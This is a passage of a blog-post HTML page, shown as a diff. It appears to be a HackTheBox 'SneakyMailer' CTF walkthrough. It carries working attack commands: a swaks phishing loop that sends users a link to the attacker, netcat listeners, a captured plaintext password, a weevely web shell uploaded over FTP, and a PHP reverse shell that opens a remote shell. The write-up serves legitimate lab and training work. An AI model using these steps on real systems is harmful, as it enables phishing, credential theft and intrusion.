@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="SneakyMailer just retired on Hackthebox, it’s a Medium difficulty Linux box created by sulcud.This box reminded me of a few other one like Chaos where you have to access victims SMTP credentials and">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - SneakyMailer">
+<meta property="og:url" content="https://hg8.sh/posts/sneakymailer/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="SneakyMailer just retired on Hackthebox, it’s a Medium difficulty Linux box created by sulcud.This box reminded me of a few other one like Chaos where you have to access victims SMTP credentials and">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/87920050-f4ca3400-ca78-11ea-9303-659ba6254f94.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/87946333-29061a80-caa2-11ea-931c-7a4e55248052.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/87947836-2f959180-caa4-11ea-92dc-f70a71a3a0fa.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/89170852-8c06af80-d580-11ea-80db-452748f03799.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/89271579-33e1b300-d63d-11ea-88bc-4a765da8bb91.png">
+<meta property="article:published_time" content="2020-11-27T23:00:00.000Z">
+<meta property="article:modified_time" content="2020-11-28T17:56:08.459Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="ftp">
+<meta property="article:tag" content="gtfobins">
+<meta property="article:tag" content="sneakymailer">
+<meta property="article:tag" content="smtp">
+<meta property="article:tag" content="fishing">
+<meta property="article:tag" content="imap">
+<meta property="article:tag" content="swaks">
+<meta property="article:tag" content="php reverse shell">
+<meta property="article:tag" content="pypi">
+<meta property="article:tag" content="pypiserver">
+<meta property="article:tag" content="htpasswd">
+<meta property="article:tag" content="setuptools">
+<meta property="article:tag" content="pip">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/87920050-f4ca3400-ca78-11ea-9303-659ba6254f94.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>HackTheBox - SneakyMailer :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/posts/tabby/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extract-users-email-list"><span class="toc-number">1.2.</span> <span class="toc-text">Extract users email list</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phishing-through-SMTP"><span class="toc-number">1.3.</span> <span class="toc-text">Phishing through SMTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Access-FTP-Dev-server"><span class="toc-number">1.4.</span> <span class="toc-text">Access FTP Dev server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Reverse-Shell"><span class="toc-number">1.5.</span> <span class="toc-text">PHP Reverse Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-developer"><span class="toc-number">1.6.</span> <span class="toc-text">Pivot www-data -&gt; developer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-developer-gt-low"><span class="toc-number">1.7.</span> <span class="toc-text">Pivot developer -&gt; low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-PyPi-server-htpasswd"><span class="toc-number">1.8.</span> <span class="toc-text">Cracking PyPi server htpasswd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-malicious-Python-Package"><span class="toc-number">1.9.</span> <span class="toc-text">Creating malicious Python Package</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pip-privilege-escalation"><span class="toc-number">2.2.</span> <span class="toc-text">Pip privilege escalation</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HackTheBox - SneakyMailer
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2020-11-27T23:00:00.000Z" itemprop="datePublished">28-11-2020</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      12 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img width="576" alt="SneakyMailer HackTheBox" src="https://user-images.githubusercontent.com/9076747/87920050-f4ca3400-ca78-11ea-9303-659ba6254f94.png">
+
+<p>SneakyMailer just retired on Hackthebox, it’s a Medium difficulty Linux box created by <a href="https://www.hackthebox.eu/home/users/profile/106709" target="_blank" rel="noopener">sulcud</a>.<br>This box reminded me of a few other one like <a href="https://www.hackthebox.eu/home/machines/profile/167" target="_blank" rel="noopener">Chaos</a> where you have to access victims SMTP credentials and <a href="https://www.hackthebox.eu/home/machines/profile/213" target="_blank" rel="noopener">Registry</a> for the package installer instance to exploit.<br>In the end it’s a very well designed box that allowed me to play with SMTP and PyPi package manager. Highly recommended. </p>
+<p><strong>Tl;Dr:</strong> In order to get the user flag you had use the list of users emails from the website to send phishing emails. One user will input his credentials, allowing us to connect to his mailbox and retrieve the FTP password of a developer account in his mails. From there we can upload a PHP reverse shell to get a shell as developer user. At this point you can access a PyPi server instance, create and upload a malicious package in order to get access to <code>low</code> user and get the flag.<br>To get the root flag you had to exploit a sudo configuration allowing to run <code>pip</code> command as root. To do so you create another malicious <code>setup.py</code> package that will spawn a privileged shell since it’s run as root.</p>
+<p>Alright! Let’s get into the details now!</p>
+<hr>
+<p>First thing first, let’s add the box IP to the hosts file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.197 sneakymailer.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>and let’s start!</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC sneakymailer.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> sneakymailer.htb (10.10.10.197)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">21/tcp   open  ftp      vsftpd 3.0.3</span><br><span class="line">22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">25/tcp   open  smtp     Postfix smtpd</span><br><span class="line">80/tcp   open  http     nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: Did not follow redirect to http://sneakycorp.htb</span><br><span class="line">143/tcp  open  imap     Courier Imapd (released 2018)</span><br><span class="line">993/tcp  open  ssl/imap Courier Imapd (released 2018)</span><br><span class="line">8080/tcp open  http     nginx 1.14.2</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 45.92 seconds</span><br></pre></td></tr></table></figure>
+
+<p>We have a few interesting port open, two HTTP port on 80 and a <code>nginx</code> proxy on port 8080.</p>
+<p>Opening <a href="http://sneakymailer.htb" target="_blank" rel="noopener">http://sneakymailer.htb</a> redirect to <a href="http://sneakycorp.htb" target="_blank" rel="noopener">http://sneakycorp.htb</a> which displays the following page:</p>
+<img width="976" alt="sneakymailer homepage" src="https://user-images.githubusercontent.com/9076747/87946333-29061a80-caa2-11ea-931c-7a4e55248052.png">
+
+<p>We get a few interesting informations, stating that a <code>POP3</code> and <code>SMTP</code> are complete and that it’s possible to install Python <code>pip</code> module on the servers.</p>
+<p>The “Team” page allows us to list users and their emails address:</p>
+<img width="1127" alt="sneakymailer team page" src="https://user-images.githubusercontent.com/9076747/87947836-2f959180-caa4-11ea-92dc-f70a71a3a0fa.png">
+
+<p>Let’ continue our recon, the homepage state Python package can be installed to the server, yet we didn’t find any mentions of <code>pipy</code> or some kind of module. Let’s run <code>gobuster</code> in <code>vhost</code> mode to see if any Virtual Host exist that can be interesting: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster vhost -u sneakycorp.htb -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">Found: dev.sneakycorp.htb (Status: 200) [Size: 13742]</span><br></pre></td></tr></table></figure>
+
+<p>We got a <code>dev</code> version of the website, opening it display the exact same site but with a register function added at <code>http://dev.sneakycorp.htb/pypi/register.php</code>.</p>
+<p>While registering doesn’t seems to do anything the URL let us guess it’s a package installed with <code>pypi</code>. Let’s move on.</p>
+<p>Seeing all the emails addresses we have available, port 25 SMTP open and the name of the box it might be a good start to try phishing some users to get their credentials.</p>
+<h3 id="Extract-users-email-list"><a href="#Extract-users-email-list" class="headerlink" title="Extract users email list"></a>Extract users email list</h3><p>First let’s go back to the main site and extract all the user emails, we can use <code>cewl</code> for this task.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ./cewl.rb -e --email_file sneaky-emails.txt http://sneakycorp.htb/team.php</span><br><span class="line">[hg8@archbook ~]$ cat sneaky-emails.txt</span><br><span class="line">airisatou@sneakymailer.htb</span><br><span class="line">angelicaramos@sneakymailer.htb</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h3 id="Phishing-through-SMTP"><a href="#Phishing-through-SMTP" class="headerlink" title="Phishing through SMTP"></a>Phishing through SMTP</h3><p>Given the fact we are in a CTF scenario there is probably no need to create a real phishing page (even though it wouldn’t be hard). To start off let’s try to send a simple link to users by emails and see if anything connect back to it.</p>
+<p>Let’s open our listener on port 80:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo nc -lvnp 80</span><br><span class="line">[sudo] password <span class="keyword">for</span> hg8:</span><br></pre></td></tr></table></figure>
+
+<p>We have plenty of solutions to send SMTP, I will go with a simple way using <a href="https://www.jetmore.org/john/code/swaks/" target="_blank" rel="noopener"><code>swaks</code></a>  in a little bash script.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> email; <span class="keyword">do</span></span><br><span class="line">  swaks --to <span class="variable">$email</span> --from admin@sneakymailer.htb --header <span class="string">"Subject: Please login to my phishing site"</span> --body <span class="string">"Here -&gt; http://10.10.14.7/"</span> --server 10.10.10.197</span><br><span class="line"><span class="keyword">done</span> &lt;sneaky-emails.txt</span><br></pre></td></tr></table></figure>
+
+<p>After a little wait Paul bite the bait:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo nc -lvnp 80</span><br><span class="line">Connection from 10.10.10.197:47314</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 10.10.14.7</span><br><span class="line">User-Agent: python-requests/2.23.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 185</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt</span><br></pre></td></tr></table></figure>
+
+<p>Let’s urldecode the password using Python:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python</span><br><span class="line">Python 3.8.3 (default, May 17 2020, 18:15:42)</span><br><span class="line">&gt;&gt;&gt; import urllib.parse</span><br><span class="line">&gt;&gt;&gt; urllib.parse.unquote(<span class="string">"%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt"</span>)</span><br><span class="line"><span class="string">'^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht'</span></span><br></pre></td></tr></table></figure>
+
+<p>We got the following credentials:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paulbyrd@sneakymailer.htb:^(<span class="comment">#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</span></span><br></pre></td></tr></table></figure>
+
+<p>We don’t have any entry points so far except SMPT so let’s login to Paul account to see if we can find interesting emails. To do so we can use <code>evolution</code> (<code>apt install evolution gamin</code>). </p>
+<p>Since I don’t have GUI on my CTF/Pentest box I gave a try to HackTheBox <a href="https://www.hackthebox.eu/home/pwnbox" target="_blank" rel="noopener">pwnbox</a> which was quite nice and perfect to use for this kind of scenarios.</p>
+<p>We configure Paul account with the informations we got:</p>
+<img width="801" alt="sneakymailer smtp connection" src="https://user-images.githubusercontent.com/9076747/89170852-8c06af80-d580-11ea-80db-452748f03799.png">
+
+<p>Upon synchronisation we find an interesting email in the Sent folder:</p>
+<blockquote>
+<p>From: Paul Byrd <a href="mailto:&#x70;&#x61;&#x75;&#108;&#98;&#121;&#114;&#x64;&#x40;&#115;&#x6e;&#x65;&#97;&#107;&#x79;&#x6d;&#x61;&#105;&#x6c;&#101;&#114;&#x2e;&#x68;&#116;&#98;">&#x70;&#x61;&#x75;&#108;&#98;&#121;&#114;&#x64;&#x40;&#115;&#x6e;&#x65;&#97;&#107;&#x79;&#x6d;&#x61;&#105;&#x6c;&#101;&#114;&#x2e;&#x68;&#116;&#98;</a><br>To: root &lt;root@debian&gt;<br>Subject: Password reset<br>Date: Fri, 15 May 2020 13:03:37 -0500 </p>
+<p>Hello administrator, I want to change this password for the developer account  Username: developer Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C  Please notify me when you do it</p>
+</blockquote>
+<h3 id="Access-FTP-Dev-server"><a href="#Access-FTP-Dev-server" class="headerlink" title="Access FTP Dev server"></a>Access FTP Dev server</h3><p><code>nmap</code> scan revealed open FTP port. Now that we have a developper credential maybe we can login to it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ftp sneakymailer.htb</span><br><span class="line">Connected to sneakymailer.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (sneakymailer.htb:hugo): developer</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br></pre></td></tr></table></figure>
+
+<p>Bingo, we have access to what seems to be the development website we found earlier (<code>http://dev.sneakycorp.htb</code>):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxr-x    8 0        1001         4096 Jun 30 01:15 dev</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> dev</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 26 19:52 css</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 26 19:52 img</span><br><span class="line">-rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php</span><br><span class="line">drwxr-xr-x    3 0        0            4096 May 26 19:52 js</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi</span><br><span class="line">drwxr-xr-x    4 0        0            4096 May 26 19:52 scss</span><br><span class="line">-rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php</span><br><span class="line">drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h3><p>With our FTP access we have the possibility to upload files. It’s the perfect scenario to upload a PHP Web Shell.<br>To generate the reserve shell I will use the excellent <a href="https://github.com/epinna/weevely3" target="_blank" rel="noopener"><code>weevely</code></a>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python weevely.py generate h4ckTheB0x hg8.php</span><br><span class="line">Generated <span class="string">'hg8.php'</span> with password <span class="string">'h4ckTheB0x'</span> of 685 byte size.</span><br></pre></td></tr></table></figure>
+
+<p>And upload it through FTP:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ftp sneakymailer.htb</span><br><span class="line">Connected to sneakymailer.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (sneakymailer.htb:hugo): developer</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> dev</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; put hg8.php</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Ok to send data.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">685 bytes sent <span class="keyword">in</span> 0.000195 seconds (3.35 Mbytes/s)</span><br></pre></td></tr></table></figure>
+
+<p>We should now be able to connect to the web shell (still using <code>weevely</code>):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python weevely.py http://dev.sneakycorp.htb/hg8.php h4ckTheB0x</span><br><span class="line"></span><br><span class="line">www-data@sneakymailer:/var/www/dev.sneakycorp.htb/dev $ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+
+<p>Unfortunately a clean-up script seems to remove any file uploaded to the server, cutting our webshell connection. To circumvent this workflow let’s upload a PHP reserve shell opener instead (like this one for <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php." target="_blank" rel="noopener">example</a>).</p>
+<p>Let’s open our listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>Drop our new PHP file and call it to trigger the reverse shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://dev.sneakycorp.htb/hg8.php</span><br></pre></td></tr></table></figure>
+
+<p>And bingo we get a new connection:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.197:48434</span><br><span class="line">Linux sneakymailer 4.19.0-9-amd64 <span class="comment">#1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux</span></span><br><span class="line">www-data@sneakymailer:/$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Pivot-www-data-gt-developer"><a href="#Pivot-www-data-gt-developer" class="headerlink" title="Pivot www-data -&gt; developer"></a>Pivot www-data -&gt; developer</h3><p>First let’s pivot to <code>developer</code> account (with the credentials we found earlier) since it have more privileges than <code>www-data</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@sneakymailer:/$ su - developer</span><br><span class="line">Password: m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C</span><br><span class="line"></span><br><span class="line">developer@sneakymailer:~$ id</span><br><span class="line">uid=1001(developer) gid=1001(developer) groups=1001(developer)</span><br></pre></td></tr></table></figure>
+
+<p>Looking at the <code>/home/</code> folder we can see that <code>low</code> have the <code>user.txt</code> flag:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@sneakymailer:/home/low$ ls -l</span><br><span class="line">ls -l</span><br><span class="line">total 8</span><br><span class="line">-rwxr-x--- 1 root low   33 Jul 18 05:53 user.txt</span><br><span class="line">drwxr-xr-x 6 low  low 4096 May 16 03:33 venv</span><br></pre></td></tr></table></figure>
+
+<p>Let’s now start looking around for anything that could help us pivoting to <code>low</code> user.</p>
+<h3 id="Pivot-developer-gt-low"><a href="#Pivot-developer-gt-low" class="headerlink" title="Pivot developer -&gt; low"></a>Pivot developer -&gt; low</h3><p>While searching in the <code>/var/www</code> folder we notice a subdomain we missed <code>pypi.sneakycorp.htb</code> subdomain:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">developer@sneakymailer:/$ ls /var/www/</span><br><span class="line">dev.sneakycorp.htb  html  pypi.sneakycorp.htb  sneakycorp.htb</span><br></pre></td></tr></table></figure>
+
+<p>Let’s add it to our hosts file and take a look:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://pypi.sneakycorp.htb/ -I</span><br><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Server: nginx/1.14.2</span><br><span class="line">Date: Sat, 18 Jul 2020 11:56:25 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 185</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http://sneakycorp.htb</span><br></pre></td></tr></table></figure>
+
+<p>Nothing there unfortunately, but maybe it’s on port <code>8080</code> returned earlier by <code>nmap</code> ?</p>
+<img width="739" alt="pypi server" src="https://user-images.githubusercontent.com/9076747/89271579-33e1b300-d63d-11ea-88bc-4a765da8bb91.png">
+
+<p>This is interesting, we have a way to create and upload our own Python packages. </p>
+<h3 id="Cracking-PyPi-server-htpasswd"><a href="#Cracking-PyPi-server-htpasswd" class="headerlink" title="Cracking PyPi server htpasswd"></a>Cracking PyPi server htpasswd</h3><p>Reading through the <a href="https://github.com/pypiserver/pypiserver#apache-like-authentication-htpasswd" target="_blank" rel="noopener">documentation of <code>pypiserver</code></a> we find that it’s possible to protect package upload with an <code>.htpasswd</code> authentification.</p>
+<p>Indeed while searching the folder we find it:</p>
